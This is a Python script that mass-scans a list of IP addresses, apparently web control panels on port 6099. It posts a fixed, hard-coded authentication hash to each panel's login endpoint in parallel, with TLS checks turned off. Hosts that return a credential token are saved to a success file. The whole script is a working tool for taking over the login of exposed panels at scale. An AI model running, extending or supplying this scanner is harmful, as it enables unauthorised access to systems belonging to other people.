import requests
import json
from multiprocessing import Pool, cpu_count
from pathlib import Path

def load_ips(filename='ips.txt', default_port=6099):
    ips = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                ip, port = line.split(':', 1)
                port = port.strip()
            else:
                ip, port = line, str(default_port)
            ips.append((ip.strip(), port))
    return ips

def request_ip(ip_port):
    ip, port = ip_port
    url = f"http://{ip}:{port}/api/auth/login"
    headers = {
        'Authorization': 'Bearer',
        'Referer': f"http://{ip}:{port}/webui/web_login",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
    }
    data = '{"hash":"fab552ce31e45b51288bb374b7e08d720f1d612e20fb7361246139c1e476f0b0"}'

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
        text = response.text.strip()
        try:
            resp_json = response.json()
        except json.JSONDecodeError:
            return (f"{ip}:{port}", False, f"非JSON响应: {text}")

        if (
            isinstance(resp_json, dict)
            and resp_json.get("code") == 0
            and "data" in resp_json
            and "Credential" in resp_json["data"]
            and resp_json.get("message") == "success"
        ):
            return (f"{ip}:{port}", True, text)
        else:
            return (f"{ip}:{port}", False, text)

    except Exception as e:
        return (f"{ip}:{port}", False, f"Exception: {e}")


def main():
    ips = load_ips()
    print(f"loaded {len(ips)} Ips")

    success_file = Path('success_ips.txt')
    error_file = Path('error_ips.txt')

    pool = Pool(processes=cpu_count())
    results = pool.map(request_ip, ips)
    pool.close()
    pool.join()

    success_lines = []
    error_lines = []

    for ip_port, success, content in results:
        if success:
            #success_lines.append(f"{ip_port} callback: {content}")
            success_lines.append(f"{ip_port}")
        else:
            error_lines.append(f"{ip_port} callback: {content}")

    success_file.write_text("\n".join(success_lines), encoding='utf-8')
    error_file.write_text("\n".join(error_lines), encoding='utf-8')

    print(f"success ips: {len(success_lines)}，failed_ips: {len(error_lines)}")

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
